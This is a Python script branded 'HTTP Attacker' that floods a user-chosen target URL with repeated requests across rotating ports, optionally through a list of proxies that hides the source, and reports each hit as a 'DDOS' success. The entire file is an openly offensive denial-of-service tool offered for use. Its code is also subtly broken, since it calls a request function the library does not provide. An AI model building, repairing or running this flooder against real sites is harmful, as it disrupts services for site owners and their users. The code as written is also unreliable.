import colorama
from colorama import Fore, Style
import requests
from urllib.parse import urlparse, urlunparse
import time
import os

colorama.init(autoreset=True)

def validate_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def get_ports():
    port_input = input(Fore.YELLOW + "Enter ports (comma-separated or TXT file path): ").strip()
    if os.path.isfile(port_input):
        with open(port_input, 'r') as f:
            ports = f.read().replace(',', ' ').split()
    else:
        ports = port_input.replace(',', ' ').split()
    
    valid_ports = []
    for p in ports:
        try:
            port = int(p)
            if 1 <= port <= 65535:
                valid_ports.append(str(port))
            else:
                print(Fore.RED + f"Invalid port {p}. Skipping.")
        except:
            print(Fore.RED + f"Invalid port {p}. Skipping.")
    return valid_ports

def send_requests(target_url, num_requests, ports, proxies=None):
    parsed = urlparse(target_url)
    hostname = parsed.hostname
    scheme = parsed.scheme or 'http'
    path = parsed.path or '/'

    for i in range(num_requests):
        current_port = ports[i % len(ports)]
        netloc = f"{hostname}:{current_port}" if current_port else hostname
        new_url = parsed._replace(netloc=netloc, scheme=scheme)
        final_url = urlunparse(new_url)

        proxy_info = ""
        proxy_dict = None
        if proxies:
            current_proxy = proxies[i % len(proxies)]
            proxy_dict = {'http': f'http://{current_proxy}', 'https': f'http://{current_proxy}'}
            proxy_info = f" via proxy {current_proxy}"

        try:
            start_time = time.time()
            if proxies:
                response = requests.POST(final_url, proxies=proxy_dict, timeout=5)
            else:
                response = requests.POST(final_url, timeout=5)
            elapsed = (time.time() - start_time) * 1000
            print(Fore.GREEN + f"[+] DDOS {i+1}{proxy_info} to {final_url} succeeded (Status: {response.status_code}, Time: {elapsed:.2f}ms)")
        except Exception as e:
            print(Fore.RED + f"[-] Request {i+1}{proxy_info} to {final_url} failed. Error: {str(e)}")
        
        time.sleep(1)

def main():
    print(Fore.CYAN + Style.BRIGHT + "\n===== HTTP Attacker =====")
    print(Fore.MAGENTA + "Created by MR ERLIA")
    print(Fore.CYAN + "Telegram: @MR_ERLIA")
    print(Fore.CYAN + "GitHub: https://github.com/MR-ERLIA")
    print(Fore.CYAN + "===========================")

    while True:
        choice = input(Fore.YELLOW + "\nChoose attack mode (1/2/q):\n1) HTTP D\n2) HTTP DD\nq) Quit\n> ").strip().lower()

        if choice == 'q':
            print(Fore.CYAN + "Goodbye!")
            break

        if choice not in ['1', '2']:
            print(Fore.RED + "Invalid choice!")
            continue

        while True:
            url = input(Fore.YELLOW + "\nEnter target URL (e.g., http://example.com): ").strip()
            if validate_url(url):
                break
            print(Fore.RED + "Invalid URL format. Please include http:// or https://")

        ports = []
        while not ports:
            ports = get_ports()
            if not ports:
                print(Fore.RED + "No valid ports provided!")

        while True:
            try:
                num_requests = int(input(Fore.YELLOW + "Enter number of requests: "))
                if num_requests > 0:
                    break
                print(Fore.RED + "Please enter a positive number")
            except:
                print(Fore.RED + "Invalid number!")

        proxies = []
        if choice == '2':
            while True:
                proxy_file = input(Fore.YELLOW + "Enter proxy TXT file path: ").strip()
                if os.path.isfile(proxy_file):
                    with open(proxy_file, 'r') as f:
                        proxies = [line.strip() for line in f if ':' in line.strip()]
                    if proxies:
                        break
                    print(Fore.RED + "No valid proxies found in file (format: ip:port)")
                else:
                    print(Fore.RED + "File not found!")

        confirm = input(Fore.RED + Style.BRIGHT + f"\nAbout to launch {num_requests} requests. Confirm? (y/n): ").lower()
        if confirm != 'y':
            print(Fore.CYAN + "Attack canceled!")
            continue

        print(Fore.CYAN + "\n[+] Attack started. Press Ctrl+C to stop...")
        try:
            send_requests(
                target_url=url,
                num_requests=num_requests,
                ports=ports,
                proxies=proxies if choice == '2' else None
            )
        except KeyboardInterrupt:
            print(Fore.RED + "\nAttack interrupted by user!")

        print(Fore.CYAN + "\n[+] Attack completed!")

if __name__ == "__main__":
    main()
